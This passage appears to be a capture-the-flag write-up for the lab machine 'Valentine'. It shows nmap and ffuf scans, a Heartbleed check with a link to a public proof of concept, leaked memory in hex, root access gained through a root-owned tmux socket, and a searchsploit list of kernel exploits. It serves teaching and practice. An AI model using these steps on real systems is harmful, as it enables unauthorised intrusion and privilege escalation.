...
|_ssl-date: 2021-05-24T09:33:44+00:00; -1s from scanner time.
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

ffuf
```
$ ffuf -w /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt -u http://10.10.10.79/FUZZ  
...
decoding in cyberchef from hex
```
...
```
$ sudo nmap --script=ssl-heartbleed -p 443 10.10.10.79

Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-24 03:02 PDT
Nmap scan report for 10.10.10.79
...
[heartbleed exploit link](https://github.com/sensepost/heartbleed-poc/blob/master/heartbleed-poc.py)
...
<snip>
  ...
  0150: 6D 56 30 61 47 56 6F 65 58 42 6C 43 67 3D 3D D1  mV0aGVoeXBlCg==.
  0160: 14 DB 80 FA 22 4D 25 A6 F7 88 12 F5 2A 86 6B 9F  ...."M%.....*.k.
  0170: 18 FB 4A 0C 0C 0C 0C 0C 0C 0C 0C 0C 0C 0C 0C 0C  ..J.............
...
root       1011  0.0  0.1  26416  1672 ?        Ss   02:32   0:01 /usr/bin/tmux -S /.devs/dev_sess
...
exploiting tmux session running as root
```
hype@Valentine:~$ /usr/bin/tmux -S /.devs/dev_sess

root@Valentine:/run/shm# id

uid=0(root) gid=0(root) groups=0(root)
```

Priv #2 (kernel exploit)
...
Linux Kernel 2.6.22 < 3.9 - 'Dirty COW PTRACE_POKEDATA' Race Condition (Write Ac | linux/local/40838.c
Linux Kernel 2.6.22 < 3.9 - 'Dirty COW' 'PTRACE_POKEDATA' Race Condition Privile | linux/local/40839.c
Linux Kernel 2.6.22 < 3.9 - 'Dirty COW' /proc/self/mem Race Condition (Write Acc | linux/local/40611.c
Linux Kernel 2.6.39 < 3.2.2 (Gentoo / Ubuntu x86/x64) - 'Mempodipper' Local Priv | linux/local/18411.c
Linux Kernel 2.6.39 < 3.2.2 (x86/x64) - 'Mempodipper' Local Privilege Escalation | linux/local/35161.c
Linux Kernel 3.0 < 3.3.5 - 'CLONE_NEWUSER|CLONE_FS' Local Privilege Escalation   | linux/local/38390.c
Linux Kernel 3.14-rc1 < 3.15-rc4 (x64) - Raw Mode PTY Echo Race Condition Privil | linux_x86-64/local/33516.c
Linux Kernel 3.2.0-23/3.5.0-23 (Ubuntu 12.04/12.04.1/12.04.2 x64) - 'perf_sweven | linux_x86-64/local/33589.c
...
Linux Kernel < 3.2.0-23 (Ubuntu 12.04 x64) - 'ptrace/sysret' Local Privilege Esc | linux_x86-64/local/34134.c
Linux Kernel < 3.4.5 (Android 4.2.2/4.4 ARM) - Local Privilege Escalation        | arm/local/31574.c
Linux Kernel < 3.5.0-23 (Ubuntu 12.04.2 x64) - 'SOCK_DIAG' SMEP Bypass Local Pri | linux_x86-64/local/44299.c
Linux Kernel < 3.8.9 (x86-64) - 'perf_swevent_init' Local Privilege Escalation ( | linux_x86-64/local/26131.c
Linux Kernel < 3.8.x - open-time Capability 'file_ns_capable()' Local Privilege  | linux/local/25450.c
